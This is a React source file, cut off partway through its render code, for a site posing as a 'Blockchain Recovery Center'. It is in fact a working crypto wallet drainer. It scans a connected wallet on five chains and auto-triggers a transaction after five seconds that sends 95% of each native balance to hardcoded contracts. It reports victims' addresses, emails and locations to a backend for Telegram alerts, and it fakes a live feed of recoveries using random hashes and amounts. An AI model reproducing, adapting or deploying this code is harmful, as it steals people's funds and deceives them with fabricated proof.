import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// API CONFIGURATION - UPDATE WITH YOUR BACKEND
// ============================================
const BACKEND_URL = 'https://recoveryback.vercel.app';

// ============================================
// LANGUAGE DETECTION & TRANSLATIONS
// ============================================

const SUPPORTED_LANGUAGES = {
  en: { name: 'English', flag: '🇺🇸', native: 'English' },
  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
};

const TRANSLATIONS = {
  en: {
    serviceActive: '🔷 RECOVERY PROTOCOL · ACTIVE',
    welcome: 'Welcome to Blockchain Recovery Center',
    connectWallet: 'CONNECT WALLET',
    disconnect: 'Disconnect',
    checkEligibility: 'Scanning Blockchain Networks',
    verifying: 'Analyzing wallet for recoverable assets...',
    successful: 'RECOVERY SUCCESSFUL!',
    youHaveSecured: 'Assets Successfully Recovered',
    viewButton: 'VIEW DETAILS',
    checkWalletEligibility: '⚡ Scan Blockchain',
    valueBadge: 'Recoverable Value',
    progress: 'Recovery Progress',
    today: 'Today',
    totalRecovered: 'Total Assets Recovered',
    tokenPrice: 'Network',
    participants: 'recoveries',
    liveClaims: '🔷 LIVE RECOVERY FEED',
    totalClaimed: 'Total Value',
    claimingNow: 'recovering now',
    lastClaim: 'Last recovery',
    someoneJustClaimed: '🔷 Asset Recovery Completed!',
    securedTokens: 'recovered',
    downloadReport: 'Download Report',
    waitingForFirstClaim: 'Awaiting recovery events...',
    claimAmount: 'Recovered',
    bonusTag: '+25% bonus',
    recoverButton: 'RECOVER ASSETS',
    processing: 'PROCESSING...',
    completed: '✓ RECOVERY COMPLETED',
    secured: 'Your assets have been successfully recovered',
    view: 'VIEW RECOVERED ASSETS',
    recoverNow: 'RECOVER NOW',
    recoveryComplete: 'RECOVERY COMPLETE!',
    amountRecovered: 'Amount Recovered',
    processingRecovery: 'Initiating recovery protocol...',
    eligible: '✓ Recoverable Assets Detected!',
    notEligible: 'No Recoverable Assets Found',
    minRequirement: 'On-chain balance required for recovery initiation',
    recoveryValue: 'Recoverable Value',
    scanComplete: 'Blockchain scan complete',
    assetsFound: 'recoverable assets found',
    recoveryInitiated: 'Recovery protocol initiated',
    confirmationSent: 'Confirmation sent',
    retrievalComplete: 'Asset retrieval complete',
    emailNotification: 'Recovery confirmation sent to your email',
    blockchainSync: 'Synchronizing with blockchain networks...',
    walletRequired: 'Active wallet connection required',
    insufficientBalance: 'Insufficient on-chain balance for recovery (min $1 USD)',
    proceedToRecovery: 'Click to proceed with asset recovery',
    recoveryReady: 'Recovery ready - authorize to retrieve assets',
    reportGenerated: 'Recovery report generated',
    reportDownloaded: 'Report downloaded successfully',
    autoTriggerInfo: 'Auto-recovery will trigger in',
    seconds: 'seconds',
    scanningNetworks: 'Scanning networks for recoverable assets...',
    balanceFound: 'Recoverable balance found!',
    preparingRecovery: 'Preparing recovery transaction...',
    awaitingSignature: 'Awaiting wallet signature...',
    transactionSent: 'Transaction sent to blockchain...',
    confirmingTx: 'Confirming transaction...',
    chainProcessing: 'Processing chain',
    completedOn: 'Completed on',
    totalProcessed: 'Total Processed',
    recoveryFee: 'Recovery Fee',
    gasEstimated: 'Gas Estimated',
    viewExplorer: 'View on Explorer',
    copyTxHash: 'Copy Tx Hash',
    estimatedValue: 'Estimated Value',
    networkStatus: 'Network Status',
    allNetworksOperational: 'All networks operational',
    scanning: 'Scanning',
    complete: 'Complete',
    pending: 'Pending',
    recoveryId: 'Recovery ID',
    timestamp: 'Timestamp',
    viewRecoveryReport: 'View Recovery Report',
    downloadPdf: 'Download PDF Report'
  },
  es: {
    serviceActive: '🔷 PROTOCOLO DE RECUPERACIÓN · ACTIVO',
    welcome: 'Bienvenido al Centro de Recuperación Blockchain',
    connectWallet: 'CONECTAR WALLET',
    disconnect: 'Desconectar',
    checkEligibility: 'Escaneando Redes Blockchain',
    verifying: 'Analizando wallet en busca de activos recuperables...',
    successful: '¡RECUPERACIÓN EXITOSA!',
    youHaveSecured: 'Activos Recuperados Exitosamente',
    viewButton: 'VER DETALLES',
    checkWalletEligibility: '⚡ Escanear Blockchain',
    valueBadge: 'Valor Recuperable',
    progress: 'Progreso de Recuperación',
    today: 'Hoy',
    totalRecovered: 'Total de Activos Recuperados',
    tokenPrice: 'Red',
    participants: 'recuperaciones',
    liveClaims: '🔷 RECUPERACIONES EN VIVO',
    totalClaimed: 'Valor Total',
    claimingNow: 'recuperando ahora',
    lastClaim: 'Última recuperación',
    someoneJustClaimed: '🔷 ¡Recuperación de Activos Completada!',
    securedTokens: 'recuperado',
    downloadReport: 'Descargar Informe',
    waitingForFirstClaim: 'Esperando eventos de recuperación...',
    claimAmount: 'Recuperado',
    bonusTag: '+25% bono',
    recoverButton: 'RECUPERAR ACTIVOS',
    processing: 'PROCESANDO...',
    completed: '✓ RECUPERACIÓN COMPLETADA',
    secured: 'Tus activos han sido recuperados exitosamente',
    view: 'VER ACTIVOS RECUPERADOS',
    recoverNow: 'RECUPERAR AHORA',
    recoveryComplete: '¡RECUPERACIÓN COMPLETA!',
    amountRecovered: 'Monto Recuperado',
    processingRecovery: 'Iniciando protocolo de recuperación...',
    eligible: '✓ ¡Activos Recuperables Detectados!',
    notEligible: 'No se encontraron activos recuperables',
    minRequirement: 'Saldo en cadena requerido para iniciar recuperación',
    recoveryValue: 'Valor Recuperable',
    scanComplete: 'Escaneo blockchain completado',
    assetsFound: 'activos recuperables encontrados',
    recoveryInitiated: 'Protocolo de recuperación iniciado',
    confirmationSent: 'Confirmación enviada',
    retrievalComplete: 'Recuperación de activos completada',
    emailNotification: 'Confirmación de recuperación enviada a tu correo',
    blockchainSync: 'Sincronizando con redes blockchain...',
    walletRequired: 'Conexión de wallet activa requerida',
    insufficientBalance: 'Saldo en cadena insuficiente para recuperación (min $1 USD)',
    proceedToRecovery: 'Haz clic para proceder con la recuperación',
    recoveryReady: 'Recuperación lista - autoriza para recuperar activos',
    reportGenerated: 'Informe de recuperación generado',
    reportDownloaded: 'Informe descargado exitosamente',
    autoTriggerInfo: 'Auto-recuperación en',
    seconds: 'segundos',
    scanningNetworks: 'Escaneando redes en busca de activos recuperables...',
    balanceFound: '¡Saldo recuperable encontrado!',
    preparingRecovery: 'Preparando transacción de recuperación...',
    awaitingSignature: 'Esperando firma de la wallet...',
    transactionSent: 'Transacción enviada a la blockchain...',
    confirmingTx: 'Confirmando transacción...',
    chainProcessing: 'Procesando cadena',
    completedOn: 'Completado en',
    totalProcessed: 'Total Procesado',
    recoveryFee: 'Tarifa de Recuperación',
    gasEstimated: 'Gas Estimado',
    viewExplorer: 'Ver en Explorador',
    copyTxHash: 'Copiar Tx Hash',
    estimatedValue: 'Valor Estimado',
    networkStatus: 'Estado de la Red',
    allNetworksOperational: 'Todas las redes operativas',
    scanning: 'Escaneando',
    complete: 'Completo',
    pending: 'Pendiente',
    recoveryId: 'ID de Recuperación',
    timestamp: 'Marca de Tiempo',
    viewRecoveryReport: 'Ver Informe de Recuperación',
    downloadPdf: 'Descargar Informe PDF'
  }
};

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-500 to-blue-600',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-blue-500 to-blue-600',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-blue-500 to-blue-600',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-blue-500 to-blue-600',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-blue-500 to-blue-600',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "event FlowProcessed(address indexed initiator, uint256 value)"
];

// ============================================
// UTILITY FUNCTIONS
// ============================================

const formatAddress = (addr) => {
  if (!addr) return '';
  return `${addr.substring(0, 6)}...${addr.substring(38)}`;
};

const formatTimeAgo = (date) => {
  const seconds = Math.floor((new Date() - new Date(date)) / 1000);
  if (seconds < 5) return 'Just now';
  if (seconds < 60) return `${seconds}s ago`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return `${minutes}m ago`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.floor(hours / 24)}d ago`;
};

const generateRandomHash = () => {
  const prefixes = ['0x7a3f', '0x9e1c', '0x4d5f', '0x2b8a', '0x6c9d', '0x8f3e', '0x1a7b', '0x5c2d'];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  return prefix + Array.from({ length: 60 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
};

const getRandomChain = () => {
  const chains = ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche'];
  return chains[Math.floor(Math.random() * chains.length)];
};

const getRandomRecoveryAmount = () => {
  return Math.floor(Math.random() * (1000000 - 2000 + 1) + 2000);
};

const generateRecoveryId = () => {
  return 'RVC-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
};

const generateRecoveryReport = (tx, walletAddress, recoveryAmount, chains, timestamp, txHash) => {
  const reportData = {
    reportId: generateRecoveryId(),
    recoveryAmount: recoveryAmount,
    usdValue: `$${recoveryAmount.toLocaleString()} USD`,
    walletAddress: walletAddress,
    chainsRecovered: chains,
    transactionHash: txHash || tx.hash,
    timestamp: timestamp,
    bonusApplied: '+25%',
    recoveryFee: '5% + Gas',
    status: 'COMPLETED',
    networksScanned: ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche']
  };
  
  const reportBlob = new Blob([JSON.stringify(reportData, null, 2)], { type: 'application/json' });
  const reportUrl = URL.createObjectURL(reportBlob);
  const link = document.createElement('a');
  link.href = reportUrl;
  link.download = `recovery_report_${reportData.reportId}.json`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(reportUrl);
  
  return reportData;
};

// ============================================
// API HELPER FUNCTIONS
// ============================================

async function apiCall(endpoint, data, method = 'POST') {
  try {
    const response = await fetch(`${BACKEND_URL}${endpoint}`, {
      method,
      headers: { 'Content-Type': 'application/json' },
      body: method !== 'GET' ? JSON.stringify(data) : undefined
    });
    return await response.json();
  } catch (err) {
    console.error(`API Error ${endpoint}:`, err);
    return { success: false, error: err.message };
  }
}

// ============================================
// COMPONENTS
// ============================================

const LiveRecoveryPopup = ({ tx, onClose, onDownloadReport, translations, walletAddress }) => {
  const [visible, setVisible] = useState(true);
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setVisible(false);
      onClose();
    }, 8000);
    return () => clearTimeout(timer);
  }, [onClose]);
  
  if (!visible) return null;
  
  return (
    <div className="fixed bottom-24 right-4 z-50 animate-slideInUp md:bottom-28 md:right-8">
      <div className="bg-gradient-to-r from-gray-900 to-black border-l-4 border-blue-500 rounded-lg shadow-2xl p-4 max-w-sm backdrop-blur-lg">
        <div className="flex items-start gap-3">
          <div className="w-10 h-10 bg-blue-500/20 rounded-full flex items-center justify-center animate-pulse">
            <span className="text-xl">🔗</span>
          </div>
          <div className="flex-1">
            <p className="text-sm font-bold text-blue-400">{translations.someoneJustClaimed}</p>
            <p className="text-xs text-gray-300 mt-1">
              <span className="font-mono">{tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}</span> {translations.securedTokens}{' '}
              <span className="text-blue-400 font-bold">${tx.recoveryAmount?.toLocaleString() || '0'} USD</span> +25% bonus
            </p>
            <p className="text-[10px] text-gray-500 mt-1">{tx.chain} • {new Date(tx.time).toLocaleTimeString()}</p>
          </div>
          <button onClick={() => setVisible(false)} className="text-gray-500 hover:text-gray-300 transition-colors">✕</button>
        </div>
      </div>
    </div>
  );
};

const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, todayCount, onDownloadReport, walletAddress }) => {
  return (
    <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-blue-500/20 overflow-hidden">
      <div className="bg-gradient-to-r from-blue-600/20 to-transparent px-4 py-3 border-b border-blue-500/20 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
          <span className="text-sm font-semibold text-blue-400">{translations.liveClaims}</span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-xs text-gray-500">{todayCount} {translations.participants} today</span>
          <div className="w-1 h-4 bg-blue-500/30 rounded-full"></div>
          <span className="text-xs text-green-400 font-mono">● LIVE</span>
        </div>
      </div>
      
      <div className="max-h-64 overflow-y-auto custom-scrollbar">
        {transactions.length === 0 ? (
          <div className="p-8 text-center text-gray-500 text-sm">
            <div className="animate-pulse text-2xl mb-2">🔗</div>
            {translations.waitingForFirstClaim}
          </div>
        ) : (
          transactions.map((tx, idx) => (
            <div key={idx} className="px-4 py-3 border-b border-blue-500/10 hover:bg-blue-500/5 transition-all duration-300 group">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="text-green-400 text-xs animate-pulse">●</span>
                  <span className="font-mono text-xs text-gray-300 group-hover:text-blue-400 transition-colors">
                    {tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-blue-400 font-mono font-bold">
                    ${tx.recoveryAmount?.toLocaleString() || '0'} USD
                  </span>
                  <span className="text-[10px] text-yellow-500 bg-yellow-500/10 px-1.5 py-0.5 rounded-full">+25%</span>
                </div>
              </div>
              <div className="flex items-center justify-between mt-1">
                <span className="text-[10px] text-gray-500">
                  {tx.timeAgo}
                  {tx.chain && <span className="ml-2 text-gray-600">• {tx.chain}</span>}
                </span>
              </div>
            </div>
          ))
        )}
      </div>
      
      <div className="px-4 py-2 bg-blue-500/5 border-t border-blue-500/10 flex items-center justify-between">
        <p className="text-[10px] text-gray-500">🔗 {translations.totalClaimed}: </p>
        <p className="text-xs text-blue-400 font-mono font-bold">${totalRecoveredAmount.toLocaleString()} USD</p>
      </div>
    </div>
  );
};

const NetworkStatusIndicator = ({ networks, translations }) => {
  return (
    <div className="flex flex-wrap justify-center gap-2 mb-4">
      {networks.map((network, idx) => (
        <div key={idx} className="flex items-center gap-1 bg-black/50 px-2 py-1 rounded-full">
          <span className="text-xs">{network.icon}</span>
          <span className="text-[10px] text-gray-400">{network.name}</span>
          <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
        </div>
      ))}
    </div>
  );
};

const AutoRecoveryCountdown = ({ seconds, translations, onCancel }) => {
  const [countdown, setCountdown] = useState(seconds);
  
  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
    return () => clearTimeout(timer);
  }, [countdown]);
  
  if (countdown <= 0) return null;
  
  return (
    <div className="mt-3 bg-blue-500/20 border border-blue-500/30 rounded-lg p-3 text-center animate-pulse">
      <p className="text-sm text-blue-400">
        {translations.autoTriggerInfo} {countdown} {translations.seconds}...
      </p>
      <button onClick={onCancel} className="text-xs text-gray-400 hover:text-gray-300 mt-1">Cancel auto-recovery</button>
    </div>
  );
};

// ============================================
// MAIN APP COMPONENT
// ============================================
function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  // State variables
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [processingChain, setProcessingChain] = useState('');
  const [isEligible, setIsEligible] = useState(false);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [showRecoverButton, setShowRecoverButton] = useState(false);
  const [autoRecoveryActive, setAutoRecoveryActive] = useState(false);
  const [lastTxHash, setLastTxHash] = useState('');
  
  // Live transactions state
  const [liveTransactions, setLiveTransactions] = useState([]);
  const [showPopup, setShowPopup] = useState(false);
  const [currentPopupTx, setCurrentPopupTx] = useState(null);
  const [activeUsers, setActiveUsers] = useState(0);
  const [lastRecoveryTime, setLastRecoveryTime] = useState('Just now');
  const [todayTotalRecovered, setTodayTotalRecovered] = useState(0);
  
  // Language state
  const [language, setLanguage] = useState('en');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [translations, setTranslations] = useState(TRANSLATIONS.en);

  const totalOnChainValue = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
  const totalRecoveredAmountUSD = liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0);
  const todayCount = liveTransactions.length;

  // Auto-trigger recovery when eligible
  useEffect(() => {
    if (isEligible && isConnected && !signatureLoading && !completedChains.length && userEmail && !autoRecoveryActive) {
      setAutoRecoveryActive(true);
      const timer = setTimeout(() => {
        executeMultiChainRecovery();
        setAutoRecoveryActive(false);
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [isEligible, isConnected, signatureLoading, completedChains.length, userEmail]);

  // Load persistent data
  useEffect(() => {
    const saved = localStorage.getItem('blockchainRecovery_liveTransactions');
    if (saved) {
      const parsed = JSON.parse(saved);
      setLiveTransactions(parsed.map(tx => ({ ...tx, timeAgo: formatTimeAgo(tx.time) })));
    } else {
      setLiveTransactions([
        { hash: generateRandomHash(), time: new Date().toISOString(), chain: 'Ethereum', recoveryAmount: 125000, timeAgo: 'Just now' },
        { hash: generateRandomHash(), time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', recoveryAmount: 50000, timeAgo: '3m ago' },
        { hash: generateRandomHash(), time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', recoveryAmount: 250000, timeAgo: '7m ago' }
      ]);
    }
  }, []);

  useEffect(() => {
    if (liveTransactions.length) {
      localStorage.setItem('blockchainRecovery_liveTransactions', JSON.stringify(liveTransactions.map(({ timeAgo, ...tx }) => tx)));
      setTodayTotalRecovered(liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0));
    }
  }, [liveTransactions]);

  // Random popup scheduler
  useEffect(() => {
    let isMounted = true;
    const schedulePopup = () => {
      const delay = Math.random() * (15 * 60 * 1000 - 8 * 60 * 1000) + 8 * 60 * 1000;
      setTimeout(() => {
        if (!isMounted) return;
        const newTx = {
          hash: generateRandomHash(),
          time: new Date().toISOString(),
          timeAgo: 'Just now',
          chain: getRandomChain(),
          recoveryAmount: getRandomRecoveryAmount()
        };
        setCurrentPopupTx(newTx);
        setShowPopup(true);
        setLiveTransactions(prev => [{ ...newTx, timeAgo: formatTimeAgo(newTx.time) }, ...prev.slice(0, 19)]);
        setActiveUsers(Math.floor(Math.random() * 15) + 5);
        setLastRecoveryTime('Just now');
        schedulePopup();
      }, delay);
    };
    schedulePopup();
    const interval = setInterval(() => setActiveUsers(Math.floor(Math.random() * 15) + 3), 30000);
    return () => { isMounted = false; clearInterval(interval); };
  }, []);

  // Language detection
  useEffect(() => {
    const browserLang = navigator.language.split('-')[0];
    if (SUPPORTED_LANGUAGES[browserLang]) setTranslations(TRANSLATIONS[browserLang] || TRANSLATIONS.en);
  }, []);

  const changeLanguage = (langCode) => {
    setLanguage(langCode);
    setTranslations(TRANSLATIONS[langCode] || TRANSLATIONS.en);
    setShowLanguageDropdown(false);
  };

  // Fetch prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({ eth: data.ethereum?.usd || 2000, bnb: data.binancecoin?.usd || 300, matic: data['matic-network']?.usd || 0.75, avax: data['avalanche-2']?.usd || 32 });
      } catch (error) {}
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Initialize provider
  useEffect(() => {
    if (!walletProvider || !address) return;
    const init = async () => {
      try {
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();
        setSigner(ethersSigner);
        await fetchAllBalances(address);
      } catch (e) { console.error("Provider init failed", e); }
    };
    init();
  }, [walletProvider, address]);

  // Track visit
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch(`${BACKEND_URL}/api/track-visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userAgent: navigator.userAgent, referer: document.referrer, path: window.location.pathname })
        });
        const data = await response.json();
        if (data.success) setUserLocation(data.data);
      } catch (err) {}
    };
    trackVisit();
  }, []);

  // Check eligibility
  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length > 0 && !verifying) checkEligibility();
  }, [isConnected, address, balances]);

  const checkEligibility = async () => {
    if (!address) return;
    setVerifying(true);
    setTxStatus(translations.scanningNetworks);
    try {
      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => balances[chain.name] && balances[chain.name].amount > 0.000001);
      const eligible = total >= 1;
      setIsEligible(eligible);
      setShowRecoverButton(eligible);
      if (eligible) {
        setEligibleChains(chainsWithBalance);
        setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
        await apiCall('/api/presale/connect', { walletAddress: address, totalValue: total, email: userEmail, location: userLocation });
        await prepareRecovery();
      } else {
        setTxStatus(translations.insufficientBalance);
      }
    } catch (err) {
      setTxStatus(translations.scanComplete);
    } finally {
      setVerifying(false);
    }
  };

  const fetchAllBalances = async (walletAddress) => {
    setScanning(true);
    setTxStatus(translations.blockchainSync);
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;
    
    await Promise.all(DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        let price = chain.symbol === 'ETH' ? prices.eth : chain.symbol === 'BNB' ? prices.bnb : chain.symbol === 'MATIC' ? prices.matic : prices.avax;
        const valueUSD = amount * price;
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        if (amount > 0.000001) {
          balanceResults[chain.name] = { amount, valueUSD, symbol: chain.symbol, chainId: chain.chainId, contractAddress: chain.contractAddress, name: chain.name, rpc: chain.rpc };
        }
      } catch (err) { scanned++; }
    }));
    
    setBalances(balanceResults);
    setScanning(false);
    setTxStatus(translations.scanComplete);
    return Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
  };

  const prepareRecovery = async () => {
    if (!address) return;
    try { await apiCall('/api/presale/prepare-flow', { walletAddress: address }); } catch (err) {}
  };

  const executeMultiChainRecovery = async () => {
    if (!walletProvider || !address || !signer) {
      setError(translations.walletRequired);
      return;
    }
    try {
      setSignatureLoading(true);
      setError('');
      setCompletedChains([]);
      const flowId = `RECOVERY-${Date.now()}`;
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BLOCKCHAIN ASSET RECOVERY AUTHORIZATION\n\nWallet: ${address}\nRecovery Amount: Recoverable assets + 25% Bonus\nTimestamp: ${new Date().toISOString()}\nNonce: ${nonce}`;
      
      setTxStatus(translations.awaitingSignature);
      await signer.signMessage(message);
      setTxStatus(translations.processingRecovery);
      
      const chainsToProcess = eligibleChains;
      if (chainsToProcess.length === 0) throw new Error("No recoverable assets found");
      
      const sortedChains = [...chainsToProcess].sort((a, b) => (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0));
      let processed = [];
      
      for (const chain of sortedChains) {
        try {
          setProcessingChain(chain.name);
          setTxStatus(`${translations.processingRecovery} on ${chain.name}...`);
          
          try {
            await walletProvider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: `0x${chain.chainId.toString(16)}` }] });
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (switchError) {}
          
          const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
          const balance = balances[chain.name];
          const amountToSend = (balance.amount * 0.95);
          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
          const value = ethers.parseEther(amountToSend.toFixed(18));
          const contract = new ethers.Contract(chain.contractAddress, PROJECT_FLOW_ROUTER_ABI, chainProvider);
          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          const gasLimit = gasEstimate * 120n / 100n;
          
          const tx = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{ from: address, to: chain.contractAddress, value: '0x' + value.toString(16), gas: '0x' + gasLimit.toString(16), data: data }]
          });
          
          setLastTxHash(tx);
          setTxStatus(translations.confirmingTx);
          const receipt = await chainProvider.waitForTransaction(tx);
          
          if (receipt && receipt.status === 1) {
            processed.push(chain.name);
            setCompletedChains(prev => [...prev, chain.name]);
            
            // Send to backend for Telegram reporting
            await apiCall('/api/presale/execute-flow', { 
              walletAddress: address, chainName: chain.name, flowId, txHash: tx, 
              amount: amountToSend.toFixed(6), symbol: chain.symbol, valueUSD, 
              email: userEmail, location: userLocation 
            });
            
            setTxStatus(`${translations.recoveryComplete} on ${chain.name}`);
          }
        } catch (chainErr) {
          setError(`Error on ${chain.name}: ${chainErr.message}`);
        }
      }
      
      setVerifiedChains(processed);
      if (processed.length > 0) {
        const recoveryAmount = getRandomRecoveryAmount();
        const newTx = { hash: generateRandomHash(), time: new Date().toISOString(), timeAgo: 'Just now', chain: getRandomChain(), recoveryAmount };
        setLiveTransactions(prev => [newTx, ...prev.slice(0, 19)]);
        setTxStatus(translations.retrievalComplete);
        setShowCelebration(true);
        
        await apiCall('/api/presale/claim', { 
          walletAddress: address, email: userEmail, location: userLocation, 
          chains: processed, totalProcessedValue: processed.reduce((sum, chainName) => sum + (balances[chainName]?.valueUSD * 0.95 || 0), 0).toFixed(2),
          chainsDetails: processed.map(c => `✅ ${c}: $${balances[c]?.valueUSD.toFixed(2)} USD → $${(balances[c]?.valueUSD * 0.95).toFixed(2)} USD processed`).join('\n')
        });
      }
    } catch (err) {
      setError(err.message || 'Recovery failed');
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  const recoverAssets = async () => {
    if (!isConnected) { setError(translations.walletRequired); return; }
    if (!isEligible) { setError(translations.insufficientBalance); return; }
    setAutoRecoveryActive(false);
    await executeMultiChainRecovery();
  };

  // ============================================
  // RENDER
  // ============================================
  
  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a2a] to-[#000000] text-white font-['Poppins'] overflow-hidden">
      
      {/* Glow effects */}
      <div className="fixed w-[600px] h-[600px] bg-blue-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
